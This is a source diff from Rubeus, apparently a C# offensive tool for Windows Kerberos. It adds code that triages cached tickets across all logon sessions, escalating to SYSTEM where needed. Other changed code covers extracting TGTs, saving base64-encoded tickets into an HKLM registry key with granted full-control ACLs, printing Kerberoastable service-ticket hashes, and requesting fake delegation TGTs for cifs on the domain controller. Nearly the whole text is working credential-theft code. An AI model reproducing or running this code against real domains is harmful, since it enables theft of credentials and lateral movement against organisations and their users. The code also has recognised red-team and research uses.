+            retCode = Interop.LsaConnectUntrusted(out lsaHandle);
+
+            // obtains the unique identifier for the kerberos authentication package.
+            retCode = Interop.LsaLookupAuthenticationPackage(lsaHandle, ref LSAString, out authPack);
+
+            Interop.KERB_QUERY_TKT_CACHE_REQUEST cacheQuery = new Interop.KERB_QUERY_TKT_CACHE_REQUEST();
+            Interop.KERB_QUERY_TKT_CACHE_RESPONSE cacheTickets = new Interop.KERB_QUERY_TKT_CACHE_RESPONSE();
+            Interop.KERB_TICKET_CACHE_INFO_EX ticket;
+
+            // input object for querying the ticket cache (https://docs.microsoft.com/en-us/windows/desktop/api/ntsecapi/ns-ntsecapi-_kerb_query_tkt_cache_request)
+            cacheQuery.LogonId = new Interop.LUID();
+            cacheQuery.MessageType = Interop.KERB_PROTOCOL_MESSAGE_TYPE.KerbQueryTicketCacheExMessage;
+
+            // query LSA, specifying we want the ticket cache
+            IntPtr cacheQueryPtr = Marshal.AllocHGlobal(Marshal.SizeOf(cacheQuery));
+            Marshal.StructureToPtr(cacheQuery, cacheQueryPtr, false);
+            retCode = Interop.LsaCallAuthenticationPackage(lsaHandle, authPack, cacheQueryPtr, Marshal.SizeOf(cacheQuery), out ticketsPointer, out returnBufferLength, out protocalStatus);
+
+            // parse the returned pointer into our initial KERB_QUERY_TKT_CACHE_RESPONSE structure
+            cacheTickets = (Interop.KERB_QUERY_TKT_CACHE_RESPONSE)Marshal.PtrToStructure((System.IntPtr)ticketsPointer, typeof(Interop.KERB_QUERY_TKT_CACHE_RESPONSE));
+            int count = cacheTickets.CountOfTickets;
+
+            // get the size of the structures we're iterating over
+            Int32 dataSize = Marshal.SizeOf(typeof(Interop.KERB_TICKET_CACHE_INFO_EX));
+
+            for (int i = 0; i < count; i++)
+            {
+                // iterate through the result structures
+                IntPtr currTicketPtr = (IntPtr)(long)((ticketsPointer.ToInt64() + (int)(8 + i * dataSize)));
+
+                // parse the new ptr to the appropriate structure
+                ticket = (Interop.KERB_TICKET_CACHE_INFO_EX)Marshal.PtrToStructure(currTicketPtr, typeof(Interop.KERB_TICKET_CACHE_INFO_EX));
+
+                DateTime startTime = DateTime.FromFileTime(ticket.StartTime);
+                DateTime endTime = DateTime.FromFileTime(ticket.EndTime);
+                DateTime renewTime = DateTime.FromFileTime(ticket.RenewTime);
+
+                string ticketFlags = ((Interop.TicketFlags)ticket.TicketFlags).ToString();
+
+                // extract the server name/realm and client name/realm
+                string serverName = Marshal.PtrToStringUni(ticket.ServerName.Buffer, ticket.ServerName.Length / 2);
+                string serverRealm = Marshal.PtrToStringUni(ticket.ServerRealm.Buffer, ticket.ServerRealm.Length / 2);
+                string clientName = Marshal.PtrToStringUni(ticket.ClientName.Buffer, ticket.ClientName.Length / 2);
+                string clientRealm = Marshal.PtrToStringUni(ticket.ClientRealm.Buffer, ticket.ClientRealm.Length / 2);
+
+                Console.WriteLine("    [{0:x}] - 0x{1:x} - {2}", i, (int)ticket.EncryptionType, (Interop.KERB_ETYPE)ticket.EncryptionType);
+                Console.WriteLine("      Start/End/MaxRenew: {0} ; {1} ; {2}", startTime, endTime, renewTime);
+                Console.WriteLine("      Server Name       : {0} @ {1}", serverName, serverRealm);
+                Console.WriteLine("      Client Name       : {0} @ {1}", clientName, clientRealm);
+                Console.WriteLine("      Flags             : {0} ({1:x})", ticketFlags, ticket.TicketFlags);
+                Console.WriteLine();
+            }
+
+            // clean up
+            Interop.LsaFreeReturnBuffer(ticketsPointer);
+            Marshal.FreeHGlobal(cacheQueryPtr);
+
+            // disconnect from LSA
+            Interop.LsaDeregisterLogonProcess(lsaHandle);
+        }
+
+        public static void TriageKerberosTickets(Interop.LUID targetLuid, string user = "", string service = "")
+        {
+            if (Helpers.IsHighIntegrity())
+            {
+                TriageKerberosTicketsAllUsers(targetLuid, user, service);
+            }
+            else
+            {
+                TriageKerberosTicketsCurrentUser(service);
+            }
+        }
+
+        public static void TriageKerberosTicketsAllUsers(Interop.LUID targetLuid, string user = "", string service = "")
+        {
+            // quickly triage Kerberos tickets in a table for all users on the system (assuming elevation)
+
+            //  first elevates to SYSTEM and uses LsaRegisterLogonProcessHelper connect to LSA
+            //  then calls LsaCallAuthenticationPackage w/ a KerbQueryTicketCacheExMessage message type to enumerate all cached tickets
+
+            // adapted partially from Vincent LE TOUX' work
+            //      https://github.com/vletoux/MakeMeEnterpriseAdmin/blob/master/MakeMeEnterpriseAdmin.ps1#L2939-L2950
+            // and https://www.dreamincode.net/forums/topic/135033-increment-memory-pointer-issue/
+            // also Jared Atkinson's work at https://github.com/Invoke-IR/ACE/blob/master/ACE-Management/PS-ACE/Scripts/ACE_Get-KerberosTicketCache.ps1
+
+            Console.WriteLine("\r\n\r\n[*] Action: Triage Kerberos Tickets (All Users)\r\n");
+
+            if (!Helpers.IsHighIntegrity())
+            {
+                Console.WriteLine("[X] You need to have an elevated context to dump other users' Kerberos tickets :( \r\n");
+                return;
+            }
+
+            if ((ulong)targetLuid != 0)
+            {
+                Console.WriteLine("[*] Target LUID     : 0x{0:x}", (ulong)targetLuid);
+            }
+            if (!String.IsNullOrEmpty(user))
+            {
+                Console.WriteLine("[*] Target user     : {0}", user);
+            }
+            if (!String.IsNullOrEmpty(service))
+            {
+                Console.WriteLine("[*] Target service  : {0}", service);
+            }
+            if (((ulong)targetLuid != 0) || (!String.IsNullOrEmpty(user)) || (!String.IsNullOrEmpty(service)))
+            {
+                Console.WriteLine();
+            }
+
+            var table = new ConsoleTable("LUID", "UserName", "Service", "EndTime");
+            int retCode;
+            int authPack;
+            string name = "kerberos";
+            Interop.LSA_STRING_IN LSAString;
+            LSAString.Length = (ushort)name.Length;
+            LSAString.MaximumLength = (ushort)(name.Length + 1);
+            LSAString.Buffer = name;
+
+            IntPtr lsaHandle = LsaRegisterLogonProcessHelper();
+
+            // if the original call fails then it is likely we don't have SeTcbPrivilege
+            // to get SeTcbPrivilege we can Impersonate a NT AUTHORITY\SYSTEM Token
+            if (lsaHandle == IntPtr.Zero)
+            {
+                string currentName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
+                if (currentName == "NT AUTHORITY\\SYSTEM")
+                {
+                    // if we're already SYSTEM, we have the proper privilegess to get a Handle to LSA with LsaRegisterLogonProcessHelper
+                    lsaHandle = LsaRegisterLogonProcessHelper();
+                }
+                else
+                {
+                    // elevated but not system, so gotta GetSystem() first
+                    Helpers.GetSystem();
+                    // should now have the proper privileges to get a Handle to LSA
+                    lsaHandle = LsaRegisterLogonProcessHelper();
+                    // we don't need our NT AUTHORITY\SYSTEM Token anymore so we can revert to our original token
+                    Interop.RevertToSelf();
+                }
+            }
+
+            try
+            {
+                // obtains the unique identifier for the kerberos authentication package.
+                retCode = Interop.LsaLookupAuthenticationPackage(lsaHandle, ref LSAString, out authPack);
+
+                // first return all the logon sessions
+                DateTime systime = new DateTime(1601, 1, 1, 0, 0, 0, 0); //win32 systemdate
+                UInt64 count;
+                IntPtr luidPtr = IntPtr.Zero;
+                IntPtr iter = luidPtr;
+
+                uint ret = Interop.LsaEnumerateLogonSessions(out count, out luidPtr);  // get an array of pointers to LUIDs
+
+                for (ulong i = 0; i < count; i++)
+                {
+                    IntPtr sessionData;
+                    ret = Interop.LsaGetLogonSessionData(luidPtr, out sessionData);
+                    Interop.SECURITY_LOGON_SESSION_DATA data = (Interop.SECURITY_LOGON_SESSION_DATA)Marshal.PtrToStructure(sessionData, typeof(Interop.SECURITY_LOGON_SESSION_DATA));
+
+                    // if we have a valid logon
+                    if (data.PSiD != IntPtr.Zero)
+                    {
+                        // user session data
+                        string username = Marshal.PtrToStringUni(data.Username.Buffer).Trim();
+                        System.Security.Principal.SecurityIdentifier sid = new System.Security.Principal.SecurityIdentifier(data.PSiD);
+                        string domain = Marshal.PtrToStringUni(data.LoginDomain.Buffer).Trim();
+                        string authpackage = Marshal.PtrToStringUni(data.AuthenticationPackage.Buffer).Trim();
+                        Interop.SECURITY_LOGON_TYPE logonType = (Interop.SECURITY_LOGON_TYPE)data.LogonType;
+                        DateTime logonTime = systime.AddTicks((long)data.LoginTime);
+                        string logonServer = Marshal.PtrToStringUni(data.LogonServer.Buffer).Trim();
+                        string dnsDomainName = Marshal.PtrToStringUni(data.DnsDomainName.Buffer).Trim();
+                        string upn = Marshal.PtrToStringUni(data.Upn.Buffer).Trim();
+
+                        IntPtr ticketsPointer = IntPtr.Zero;
+                        DateTime sysTime = new DateTime(1601, 1, 1, 0, 0, 0, 0);
+
+                        int returnBufferLength = 0;
+                        int protocalStatus = 0;
+
+                        Interop.KERB_QUERY_TKT_CACHE_REQUEST tQuery = new Interop.KERB_QUERY_TKT_CACHE_REQUEST();
+                        Interop.KERB_QUERY_TKT_CACHE_RESPONSE tickets = new Interop.KERB_QUERY_TKT_CACHE_RESPONSE();
+                        Interop.KERB_TICKET_CACHE_INFO_EX ticket;
+
+                        // input object for querying the ticket cache for a specific logon ID
+                        Interop.LUID userLogonID = new Interop.LUID(data.LoginID);
+                        tQuery.LogonId = userLogonID;
+
+                        if (((ulong)targetLuid == 0) || (data.LoginID == targetLuid))
+                        {
+                            tQuery.MessageType = Interop.KERB_PROTOCOL_MESSAGE_TYPE.KerbQueryTicketCacheExMessage;
+
+                            // query LSA, specifying we want the ticket cache
+                            IntPtr tQueryPtr = Marshal.AllocHGlobal(Marshal.SizeOf(tQuery));
+                            Marshal.StructureToPtr(tQuery, tQueryPtr, false);
+                            retCode = Interop.LsaCallAuthenticationPackage(lsaHandle, authPack, tQueryPtr, Marshal.SizeOf(tQuery), out ticketsPointer, out returnBufferLength, out protocalStatus);
+
+                            if (ticketsPointer != IntPtr.Zero)
+                            {
+                                // parse the returned pointer into our initial KERB_QUERY_TKT_CACHE_RESPONSE structure
+                                tickets = (Interop.KERB_QUERY_TKT_CACHE_RESPONSE)Marshal.PtrToStructure((System.IntPtr)ticketsPointer, typeof(Interop.KERB_QUERY_TKT_CACHE_RESPONSE));
+                                int count2 = tickets.CountOfTickets;
+
+                                if (count2 != 0)
+                                {
+                                    // get the size of the structures we're iterating over
+                                    Int32 dataSize = Marshal.SizeOf(typeof(Interop.KERB_TICKET_CACHE_INFO_EX));
+
+                                    for (int j = 0; j < count2; j++)
+                                    {
+                                        // iterate through the result structures
+                                        IntPtr currTicketPtr = (IntPtr)(long)((ticketsPointer.ToInt64() + (int)(8 + j * dataSize)));
+
+                                        // parse the new ptr to the appropriate structure
+                                        ticket = (Interop.KERB_TICKET_CACHE_INFO_EX)Marshal.PtrToStructure(currTicketPtr, typeof(Interop.KERB_TICKET_CACHE_INFO_EX));
+
+                                        DateTime startTime = DateTime.FromFileTime(ticket.StartTime);
+                                        DateTime endTime = DateTime.FromFileTime(ticket.EndTime);
+                                        DateTime renewTime = DateTime.FromFileTime(ticket.RenewTime);
+
+                                        string ticketFlags = ((Interop.TicketFlags)ticket.TicketFlags).ToString();
+
+                                        // extract the server name/realm and client name/realm
+                                        string serverName = Marshal.PtrToStringUni(ticket.ServerName.Buffer, ticket.ServerName.Length / 2);
+                                        string serverRealm = Marshal.PtrToStringUni(ticket.ServerRealm.Buffer, ticket.ServerRealm.Length / 2);
+                                        string clientName = Marshal.PtrToStringUni(ticket.ClientName.Buffer, ticket.ClientName.Length / 2);
+                                        string clientRealm = Marshal.PtrToStringUni(ticket.ClientRealm.Buffer, ticket.ClientRealm.Length / 2);
+
+                                        if (String.IsNullOrEmpty(user) || (Regex.IsMatch(clientName, user, RegexOptions.IgnoreCase)))
+                                        {
+                                            if (String.IsNullOrEmpty(service) || (Regex.IsMatch(serverName, service, RegexOptions.IgnoreCase)))
+                                            {
+                                                table.AddRow(data.LoginID.ToString(), String.Format("{0} @ {1}", clientName, clientRealm), serverName, endTime.ToString());
+                                            }
+                                        }
+                                    }
+                                }
+                            }
+
+                            // cleanup
+                            Interop.LsaFreeReturnBuffer(ticketsPointer);
+                            Marshal.FreeHGlobal(tQueryPtr);
+                        }
+                    }
+
+                    // move the pointer forward
+                    luidPtr = (IntPtr)((long)luidPtr.ToInt64() + Marshal.SizeOf(typeof(Interop.LUID)));
+
+                    // cleaup
+                    Interop.LsaFreeReturnBuffer(sessionData);
+                }
+                Interop.LsaFreeReturnBuffer(luidPtr);
+
+                // disconnect from LSA
+                Interop.LsaDeregisterLogonProcess(lsaHandle);
+
+                // write out the table
+                table.Write();
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("[X] Exception: {0}", ex);
+            }
+        }
+
+        public static void TriageKerberosTicketsCurrentUser(string service = "")
+        {
+            // quickly triage Kerberos tickets in a table for the current user
+
+            //  first uses LsaConnectUntrusted to connect and LsaCallAuthenticationPackage w/ a KerbQueryTicketCacheExMessage message type
+            //  to enumerate all cached tickets
+
+            // adapted partially from Vincent LE TOUX' work
+            //      https://github.com/vletoux/MakeMeEnterpriseAdmin/blob/master/MakeMeEnterpriseAdmin.ps1#L2939-L2950
+            // and https://www.dreamincode.net/forums/topic/135033-increment-memory-pointer-issue/
+            // also Jared Atkinson's work at https://github.com/Invoke-IR/ACE/blob/master/ACE-Management/PS-ACE/Scripts/ACE_Get-KerberosTicketCache.ps1
+
+            Console.WriteLine("\r\n\r\n[*] Action: Triage Kerberos Tickets (Current User)\r\n");
+
+            Interop.LUID currentLUID = GetCurrentLUID();
+            Console.WriteLine("[*] Current LUID    : {0}", currentLUID);
+
+            if (!String.IsNullOrEmpty(service))
+            {
+                Console.WriteLine("[*] Target service  : {0}", service);
+            }
+            Console.WriteLine();
+
+            var table = new ConsoleTable("LUID", "UserName", "Service", "EndTime");
+            string name = "kerberos";
+            Interop.LSA_STRING_IN LSAString;
+            LSAString.Length = (ushort)name.Length;
+            LSAString.MaximumLength = (ushort)(name.Length + 1);
+            LSAString.Buffer = name;
+
+            IntPtr ticketsPointer = IntPtr.Zero;
+            int authPack;
+            int returnBufferLength = 0;
+            int protocalStatus = 0;
+            IntPtr lsaHandle;
+            int retCode;
+
+            // If we want to look at tickets from a session other than our own
+            //      then we need to use LsaRegisterLogonProcess instead of LsaConnectUntrusted
+            retCode = Interop.LsaConnectUntrusted(out lsaHandle);
+
+            // obtains the unique identifier for the kerberos authentication package.
+            retCode = Interop.LsaLookupAuthenticationPackage(lsaHandle, ref LSAString, out authPack);
+
+            Interop.KERB_QUERY_TKT_CACHE_REQUEST cacheQuery = new Interop.KERB_QUERY_TKT_CACHE_REQUEST();
+            Interop.KERB_QUERY_TKT_CACHE_RESPONSE cacheTickets = new Interop.KERB_QUERY_TKT_CACHE_RESPONSE();
+            Interop.KERB_TICKET_CACHE_INFO_EX ticket;
+
+            // input object for querying the ticket cache (https://docs.microsoft.com/en-us/windows/desktop/api/ntsecapi/ns-ntsecapi-_kerb_query_tkt_cache_request)
+            cacheQuery.LogonId = new Interop.LUID();
+            cacheQuery.MessageType = Interop.KERB_PROTOCOL_MESSAGE_TYPE.KerbQueryTicketCacheExMessage;
+
+            // query LSA, specifying we want the ticket cache
+            IntPtr cacheQueryPtr = Marshal.AllocHGlobal(Marshal.SizeOf(cacheQuery));
+            Marshal.StructureToPtr(cacheQuery, cacheQueryPtr, false);
+            retCode = Interop.LsaCallAuthenticationPackage(lsaHandle, authPack, cacheQueryPtr, Marshal.SizeOf(cacheQuery), out ticketsPointer, out returnBufferLength, out protocalStatus);
+
+            // parse the returned pointer into our initial KERB_QUERY_TKT_CACHE_RESPONSE structure
+            cacheTickets = (Interop.KERB_QUERY_TKT_CACHE_RESPONSE)Marshal.PtrToStructure((System.IntPtr)ticketsPointer, typeof(Interop.KERB_QUERY_TKT_CACHE_RESPONSE));
+            int count = cacheTickets.CountOfTickets;
+
+            // get the size of the structures we're iterating over
+            Int32 dataSize = Marshal.SizeOf(typeof(Interop.KERB_TICKET_CACHE_INFO_EX));
+
+            for (int i = 0; i < count; i++)
+            {
+                // iterate through the result structures
+                IntPtr currTicketPtr = (IntPtr)(long)((ticketsPointer.ToInt64() + (int)(8 + i * dataSize)));
+
+                // parse the new ptr to the appropriate structure
+                ticket = (Interop.KERB_TICKET_CACHE_INFO_EX)Marshal.PtrToStructure(currTicketPtr, typeof(Interop.KERB_TICKET_CACHE_INFO_EX));
+
+                DateTime startTime = DateTime.FromFileTime(ticket.StartTime);
+                DateTime endTime = DateTime.FromFileTime(ticket.EndTime);
+                DateTime renewTime = DateTime.FromFileTime(ticket.RenewTime);
+
+                string ticketFlags = ((Interop.TicketFlags)ticket.TicketFlags).ToString();
+
+                // extract the server name/realm and client name/realm
+                string serverName = Marshal.PtrToStringUni(ticket.ServerName.Buffer, ticket.ServerName.Length / 2);
+                string serverRealm = Marshal.PtrToStringUni(ticket.ServerRealm.Buffer, ticket.ServerRealm.Length / 2);
+                string clientName = Marshal.PtrToStringUni(ticket.ClientName.Buffer, ticket.ClientName.Length / 2);
+                string clientRealm = Marshal.PtrToStringUni(ticket.ClientRealm.Buffer, ticket.ClientRealm.Length / 2);
+
+                if (String.IsNullOrEmpty(service) || (Regex.IsMatch(serverName, service, RegexOptions.IgnoreCase)))
+                {
+                    table.AddRow(currentLUID.ToString(), String.Format("{0} @ {1}", clientName, clientRealm), serverName, endTime.ToString());
+                }
+            }
+
+            // clean up
+            Interop.LsaFreeReturnBuffer(ticketsPointer);
+            Marshal.FreeHGlobal(cacheQueryPtr);
+
+            // disconnect from LSA
+            Interop.LsaDeregisterLogonProcess(lsaHandle);
+
+            // write out the table
+            table.Write();
+        }
+
+        public static List<KRB_CRED> ExtractTGTs(Interop.LUID targetLuid, bool includeComputerAccounts = false)
         {
             // extracts Kerberos TGTs for all users on the system (assuming elevation) or for a specific logon ID (luid)
 
@@ -1029,12 +1731,10 @@ namespace Rubeus
                             Interop.KERB_TICKET_CACHE_INFO ticket;
 
                             // input object for querying the ticket cache for a specific logon ID
-                            Interop.LUID userLogonID = new Interop.LUID();
-                            userLogonID.LowPart = data.LoginID.LowPart;
-                            userLogonID.HighPart = 0;
+                            Interop.LUID userLogonID = new Interop.LUID(data.LoginID);
                             tQuery.LogonId = userLogonID;
 
-                            if ((targetLuid == 0) || (data.LoginID.LowPart == targetLuid))
+                            if (((ulong)targetLuid == 0) || (data.LoginID == targetLuid))
                             {
                                 tQuery.MessageType = Interop.KERB_PROTOCOL_MESSAGE_TYPE.KerbQueryTicketCacheMessage;
 
@@ -1210,13 +1910,70 @@ namespace Rubeus
             }
         }
 
-        public static void DisplayTicket(KRB_CRED cred)
+        public static void SaveTicketsToRegistry(List<KRB_CRED> creds, string baseRegistryKey)
+        {
+            string user = null;
+            RegistryKey basePath = null;
+            if (Environment.UserName == "SYSTEM")
+            {
+                user = "NT AUTHORITY\\SYSTEM";
+            }
+            else
+            {
+                user = Environment.UserDomainName + "\\" + Environment.UserName;
+            };
+            try
+            {
+                Registry.LocalMachine.CreateSubKey(baseRegistryKey);
+                basePath = Registry.LocalMachine.OpenSubKey(baseRegistryKey, RegistryKeyPermissionCheck.ReadWriteSubTree);
+                RegistrySecurity rs = basePath.GetAccessControl();
+                RegistryAccessRule rar = new RegistryAccessRule(
+                    user,
+                    RegistryRights.FullControl,
+                    InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit,
+                    PropagationFlags.None,
+                    AccessControlType.Allow);
+                rs.AddAccessRule(rar);
+                basePath.SetAccessControl(rs);
+            }
+            catch
+            {
+                Console.WriteLine("[-] Error setting correct ACLs for HKLM:\\{0}", baseRegistryKey);
+                basePath = null;
+            }
+            if (basePath != null)
+            {
+                foreach (KRB_CRED cred in creds)
+                {
+                    string userName = cred.enc_part.ticket_info[0].pname.name_string[0];
+                    string domainName = cred.enc_part.ticket_info[0].prealm;
+                    DateTime startTime = TimeZone.CurrentTimeZone.ToLocalTime(cred.enc_part.ticket_info[0].starttime);
+                    DateTime endTime = TimeZone.CurrentTimeZone.ToLocalTime(cred.enc_part.ticket_info[0].endtime);
+                    DateTime renewTill = TimeZone.CurrentTimeZone.ToLocalTime(cred.enc_part.ticket_info[0].renew_till);
+                    Interop.TicketFlags flags = cred.enc_part.ticket_info[0].flags;
+                    string base64TGT = Convert.ToBase64String(cred.Encode().Encode());
+
+                    Microsoft.Win32.RegistryKey userData = basePath.CreateSubKey(userName + "@" + domainName);
+
+                    // Create the keys underneath this
+                    userData.SetValue("Username", domainName + "\\" + userName);
+                    userData.SetValue("StartTime", startTime);
+                    userData.SetValue("EndTime", endTime);
+                    userData.SetValue("RenewTill", renewTill);
+                    userData.SetValue("Flags", flags);
+                    userData.SetValue("Base64EncodedTicket", base64TGT);
+                }
+                Console.WriteLine("\r\n[*] Wrote {0} tickets to HKLM:\\{1}.", creds.Count, baseRegistryKey);
+            }
+        }
+
+        public static void DisplayTicket(KRB_CRED cred, bool extractKerberoastHash = false)
         {
             Console.WriteLine("\r\n[*] Action: Describe Ticket\r\n");
 
-            string userName = cred.enc_part.ticket_info[0].pname.name_string[0];
+            string userName = string.Join("@", cred.enc_part.ticket_info[0].pname.name_string.ToArray());
             string domainName = cred.enc_part.ticket_info[0].prealm;
-            string sname = cred.enc_part.ticket_info[0].sname.name_string[0];
+            string sname = string.Join("/", cred.enc_part.ticket_info[0].sname.name_string.ToArray());
             string srealm = cred.enc_part.ticket_info[0].srealm;
             string keyType = String.Format("{0}", (Interop.KERB_ETYPE)cred.enc_part.ticket_info[0].key.keytype);
             string b64Key = Convert.ToBase64String(cred.enc_part.ticket_info[0].key.keyvalue);
@@ -1224,7 +1981,7 @@ namespace Rubeus
             DateTime endTime = TimeZone.CurrentTimeZone.ToLocalTime(cred.enc_part.ticket_info[0].endtime);
             DateTime renewTill = TimeZone.CurrentTimeZone.ToLocalTime(cred.enc_part.ticket_info[0].renew_till);
             Interop.TicketFlags flags = cred.enc_part.ticket_info[0].flags;
-            
+
             Console.WriteLine("  UserName              :  {0}", userName);
             Console.WriteLine("  UserRealm             :  {0}", domainName);
             Console.WriteLine("  ServiceName           :  {0}", sname);
@@ -1234,7 +1991,24 @@ namespace Rubeus
             Console.WriteLine("  RenewTill             :  {0}", renewTill);
             Console.WriteLine("  Flags                 :  {0}", flags);
             Console.WriteLine("  KeyType               :  {0}", keyType);
-            Console.WriteLine("  Base64(key)           :  {0}\r\n", b64Key);
+            Console.WriteLine("  Base64(key)           :  {0}", b64Key);
+
+            if (extractKerberoastHash && !Regex.IsMatch(sname, "^krbtgt.*", RegexOptions.IgnoreCase))
+            {
+                // if this isn't a TGT, try to display a Kerberoastable hash
+                if (!keyType.Equals("rc4_hmac"))
+                {
+                    // can only display rc4_hmac as it doesn't have a salt. DES/AES keys require the user/domain as a salt,
+                    //      and we don't have the user account name that backs the requested SPN for the ticket, no no dice :(
+                    Console.WriteLine("\r\n[!] Service ticket uses encryption key type '{0}', unable to extract hash and salt.", keyType);
+                }
+                else
+                {
+                    Roast.DisplayTGShash(cred);
+                }
+            }
+
+            Console.WriteLine();
         }
 
         public static byte[] GetEncryptionKeyFromCache(string target, Interop.KERB_ETYPE etype)
@@ -1307,65 +2081,6 @@ namespace Rubeus
                 byte[] sessionKey = new byte[sessionKeyLength];
                 Marshal.Copy(response.Ticket.SessionKey.Value, sessionKey, 0, sessionKeyLength);
 
-                //string serviceName = "";
-                //if (response.Ticket.ServiceName != IntPtr.Zero)
-                //{
-                //    Interop.KERB_EXTERNAL_NAME serviceNameStruct = (Interop.KERB_EXTERNAL_NAME)Marshal.PtrToStructure(response.Ticket.ServiceName, typeof(Interop.KERB_EXTERNAL_NAME));
-                //    if (serviceNameStruct.NameCount == 1)
-                //    {
-                //        string serviceNameStr1 = Marshal.PtrToStringUni(serviceNameStruct.Names[0].Buffer, serviceNameStruct.Names[0].Length / 2).Trim();
-                //        serviceName = serviceNameStr1;
-                //    }
-                //    else if (serviceNameStruct.NameCount == 2)
-                //    {
-                //        string serviceNameStr1 = Marshal.PtrToStringUni(serviceNameStruct.Names[0].Buffer, serviceNameStruct.Names[0].Length / 2).Trim();
-                //        string serviceNameStr2 = Marshal.PtrToStringUni(serviceNameStruct.Names[1].Buffer, serviceNameStruct.Names[1].Length / 2).Trim();
-                //        serviceName = String.Format("{0}/{1}", serviceNameStr1, serviceNameStr2);
-                //    }
-                //    else { }
-                //}
-
-
-                //string targetName = "";
-                //if (response.Ticket.TargetName != IntPtr.Zero)
-                //{
-                //    Interop.KERB_EXTERNAL_NAME targetNameStruct = (Interop.KERB_EXTERNAL_NAME)Marshal.PtrToStructure(response.Ticket.TargetName, typeof(Interop.KERB_EXTERNAL_NAME));
-                //    if (targetNameStruct.NameCount == 1)
-                //    {
-                //        string targetNameStr1 = Marshal.PtrToStringUni(targetNameStruct.Names[0].Buffer, targetNameStruct.Names[0].Length / 2).Trim();
-                //        targetName = targetNameStr1;
-                //    }
-                //    else if (targetNameStruct.NameCount == 2)
-                //    {
-                //        string targetNameStr1 = Marshal.PtrToStringUni(targetNameStruct.Names[0].Buffer, targetNameStruct.Names[0].Length / 2).Trim();
-                //        string targetNameStr2 = Marshal.PtrToStringUni(targetNameStruct.Names[1].Buffer, targetNameStruct.Names[1].Length / 2).Trim();
-                //        targetName = String.Format("{0}/{1}", targetNameStr1, targetNameStr2);
-                //    }
-                //    else { }
-                //}
-
-
-                //string clientName = "";
-                //if (response.Ticket.ClientName != IntPtr.Zero)
-                //{
-                //    Interop.KERB_EXTERNAL_NAME clientNameStruct = (Interop.KERB_EXTERNAL_NAME)Marshal.PtrToStructure(response.Ticket.ClientName, typeof(Interop.KERB_EXTERNAL_NAME));
-                //    if (clientNameStruct.NameCount == 1)
-                //    {
-                //        string clientNameStr1 = Marshal.PtrToStringUni(clientNameStruct.Names[0].Buffer, clientNameStruct.Names[0].Length / 2).Trim();
-                //        clientName = clientNameStr1;
-                //    }
-                //    else if (clientNameStruct.NameCount == 2)
-                //    {
-                //        string clientNameStr1 = Marshal.PtrToStringUni(clientNameStruct.Names[0].Buffer, clientNameStruct.Names[0].Length / 2).Trim();
-                //        string clientNameStr2 = Marshal.PtrToStringUni(clientNameStruct.Names[1].Buffer, clientNameStruct.Names[1].Length / 2).Trim();
-                //        clientName = String.Format("{0}@{1}", clientNameStr1, clientNameStr2);
-                //    }
-                //    else { }
-                //}
-                //Console.WriteLine("ServiceName: {0}", serviceName);
-                //Console.WriteLine("TargetName: {0}", targetName);
-                //Console.WriteLine("ClientName: {0}", clientName);
-
                 returnedSessionKey = sessionKey;
             }
             else
@@ -1385,22 +2100,28 @@ namespace Rubeus
             return returnedSessionKey;
         }
 
-        public static byte[] RequestFakeDelegTicket(string targetSPN = "")
+        public static byte[] RequestFakeDelegTicket(string targetSPN = "", bool display = true)
         {
-            Console.WriteLine("\r\n[*] Action: Request Fake Delegation TGT (current user)\r\n");
+            if (display)
+            {
+                Console.WriteLine("\r\n[*] Action: Request Fake Delegation TGT (current user)\r\n");
+            }
 
             byte[] finalTGTBytes = null;
 
             if (String.IsNullOrEmpty(targetSPN))
             {
-                Console.WriteLine("[*] No target SPN specified, attempting to build 'HOST/dc.domain.com'");
+                if (display)
+                {
+                    Console.WriteLine("[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'");
+                }
                 string domainController = Networking.GetDCName();
                 if(String.IsNullOrEmpty(domainController))
                 {
                     Console.WriteLine("[X] Error retrieving current domain controller");
                     return null;
                 }
-                targetSPN = String.Format("HOST/{0}", domainController);
+                targetSPN = String.Format("cifs/{0}", domainController);
             }
 
             Interop.SECURITY_HANDLE phCredential = new Interop.SECURITY_HANDLE();
@@ -1420,9 +2141,12 @@ namespace Rubeus
                 int SEC_E_OK = 0x00000000;
                 int SEC_I_CONTINUE_NEEDED = 0x00090312;
 
-                Console.WriteLine("[*] Initializing Kerberos GSS-API w/ fake delegation for target '{0}'", targetSPN);
+                if (display)
+                {
+                    Console.WriteLine("[*] Initializing Kerberos GSS-API w/ fake delegation for target '{0}'", targetSPN);
+                }
 
-                // now initialize the fake delegate ticket for the specified targetname (default HOST/DC.domain.com)
+                // now initialize the fake delegate ticket for the specified targetname (default cifs/DC.domain.com)
                 int status2 = Interop.InitializeSecurityContext(ref phCredential,
                             IntPtr.Zero,
                             targetSPN, // null string pszTargetName,
@@ -1438,11 +2162,17 @@ namespace Rubeus
 
                 if ((status2 == SEC_E_OK) || (status2 == SEC_I_CONTINUE_NEEDED))
                 {
-                    Console.WriteLine("[+] Kerberos GSS-API initialization success!");
+                    if (display)
+                    {
+                        Console.WriteLine("[+] Kerberos GSS-API initialization success!");
+                    }
 
                     if ((ClientContextAttributes & (uint)Interop.ISC_REQ.DELEGATE) == 1)
                     {
-                        Console.WriteLine("[+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.");
+                        if (display)
+                        {
+                            Console.WriteLine("[+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.");
+                        }
 
                         // the fake delegate AP-REQ ticket is now in the cache!
 
@@ -1458,7 +2188,10 @@ namespace Rubeus
                             // check if the first two bytes == TOK_ID_KRB_AP_REQ
                             if ((ClientTokenArray[startIndex] == 1) && (ClientTokenArray[startIndex+1] == 0))
                             {
-                                Console.WriteLine("[*] Found the AP-REQ delegation ticket in the GSS-API output.");
+                                if (display)
+                                {
+                                    Console.WriteLine("[*] Found the AP-REQ delegation ticket in the GSS-API output.");
+                                }
 
                                 startIndex += 2;
                                 byte[] apReqArray = new byte[ClientTokenArray.Length-startIndex];
@@ -1475,7 +2208,10 @@ namespace Rubeus
                                         // build the encrypted authenticator
                                         EncryptedData encAuthenticator = new EncryptedData(elt.Sub[0]);
                                         Interop.KERB_ETYPE authenticatorEtype = (Interop.KERB_ETYPE)encAuthenticator.etype;
-                                        Console.WriteLine("[*] Authenticator etype: {0}", authenticatorEtype);
+                                        if (display)
+                                        {
+                                            Console.WriteLine("[*] Authenticator etype: {0}", authenticatorEtype);
+                                        }
 
                                         // grab the service ticket session key from the local cache
